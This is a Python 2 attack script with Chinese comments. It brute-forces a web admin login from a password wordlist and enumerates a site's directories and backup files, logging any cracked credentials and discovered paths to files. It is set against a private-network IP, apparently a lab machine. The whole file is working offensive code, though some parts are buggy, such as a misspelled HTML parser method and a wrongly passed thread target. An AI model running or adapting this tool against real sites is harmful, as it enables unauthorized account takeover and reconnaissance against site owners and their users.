# -*- coding: utf-8 -*-
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
import sys
reload(sys)
from HTMLParser import HTMLParser
#import tensec_work
#from Tkinter import *



#爆破部分
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_startag(self,tag,attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value
class Bruter(object):
    #global password_q
    def __init__(self,username,words):
        self.username = username
        self.password_q = words
        self.find = False
        print "设置爆破用户为：%s" %username

    def run_bruteforce(self):
        for i in range(thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        filename = target_url.split("//")[1]
        filename = filename.split("/")[0] + ".txt"
        while not self.password_q.empty() and not self.find:
            brute = self.password_q.get().rstrip('\n')   #去除字符串末尾的空格
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print "爆破用户：%s ------> 尝试密码：%s -------> 剩余密码数：%s" %(self.username,brute,self.password_q.qsize())

            parser = BruteParser()
            parser.feed(page)   #返回标签的集合
            post_tags = parser.tag_results

            post_tags[username_tag] = self.username
            post_tags[password_tag] = brute
            # print post_tags
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post,login_data)
            login_result = login_response.headers  # 这个一部因目标而异
            s_login_result = int(login_result["Content-Length"])
            # print s_login_result
            # print login_result["Content-Length"]
            if s_login_result != 60:
                self.find = True
                # print login_result["Content-Length"]
                print "恭喜大佬爆破成功！！！"
                print "用户名%s它的密码为：%s" %(self.username,brute)
                print "等待爆破线程退出........"
                f = open(filename, 'a')
                content = self.username +":"+ brute +"\n"
                f.writelines(content)
                f.close()
        #return "爆破完成"



def wordlist(wordlist_file):
    #self.wordlist_file = e_wordlist_file
    fl = open(wordlist_file, "rb")
    raw_words = fl.readlines()
    fl.close()

    find_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if find_resume:
                words.put(word)
            else:
                if word == resume:
                    find_resume = True
                    print "恢复爆破位置: %s" % resume
        else:
            words.put(word)

    return words

def explode():
    e_wordlist_file = wordlist_file
    words = wordlist(e_wordlist_file)
    bruter_obj = Bruter(username,words)
    bruter_obj.run_bruteforce()


#目录遍历部分

def dir_bruter(extensions=None):
    global num,content

    filename = target_url.split("//")[1] + ".txt"
    word_queue = wordlist(d_wordlist_file)
    while not word_queue.empty():
        attempt = word_queue.get()
        num = word_queue.qsize()
        attempt_list = []

        # 如果没有，检查是否有文件扩展名
        # 这是一个目录路径
        if "." not in attempt:
            attempt_list.append("/%s/" % attempt)
        else:
            attempt_list.append("/%s" % attempt)

        # 暴力破解路径
        if extensions:
            for extension in extensions:
                attempt_list.append("/%s%s" % (attempt, extension))

        # 迭代我们的列表
        for brute in attempt_list:

            url = "%s%s" % (target_url, urllib.quote(brute))

            try:
                headers = {}
                headers["User-Agent"] = user_agent
                headers["Referer"] = referer
                headers["Client"] = client
                #headers["Cookie"] = cookie
                r = urllib2.Request(url, headers=headers)

                response = urllib2.urlopen(r)

                if len(response.read()):
                    content = str("[%d] => %s" % (response.code, url))
                    #tensec_work.text.insert(END,"dsadada")
                    print content
                    f = open(filename,'a')
                    content = content + "\n"
                    f.writelines(content)
                    f.close()

            except urllib2.HTTPError, e:

                if e.code != 404 and e.code != 503 :    #判断e是否包含code属性
                    content = str("!!! %d => %s" % (e.code, url))
                    print content


def dir_traverse():
    extensions = [".php", ".bak", ".orig","zip", ".inc",".rar"]

    for i in range(thread):
        t = threading.Thread(target=dir_bruter(), args=(extensions))
        t.setDaemon(True)
        t.start()


def execute(target):
    i = 0
    while i<5:
        #target = raw_input("你有5次机会输入，请输入你的目的--爆破或者遍历：")
        if target == "爆破":
            explode()
            break
        elif target == "遍历":
            dir_traverse()

            break
        else:
            print "input is fail"
            i = i + 1
            print i

            continue
#爆破部分
thread = 1
username = "ywc"
wordlist_file = "2.txt"    # raw_input("设置字典路径：")
resume = None
target_url = "http://192.168.85.132"  # raw_input("请输入网址：")
target_post = "http://192.168.85.132/admin.php"  # raw_input("请输入post提交网址：")
username_tag = "username"
password_tag = "password"
# success_tag = ""
content = ""
num = 0



# 目录遍历部分
filename = target_url.split("//")[1] + ".txt"
d_wordlist_file = "directory-list-2.3-medium.txt"  # # raw_input("设置字典路径：") # 用的网上的字典
user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0"
referer = "http://192.168.85.132"
client = "127.0.0.1"
# cookie = ""  #现场抓

a=raw_input("请输入攻击方式：")
execute(a)

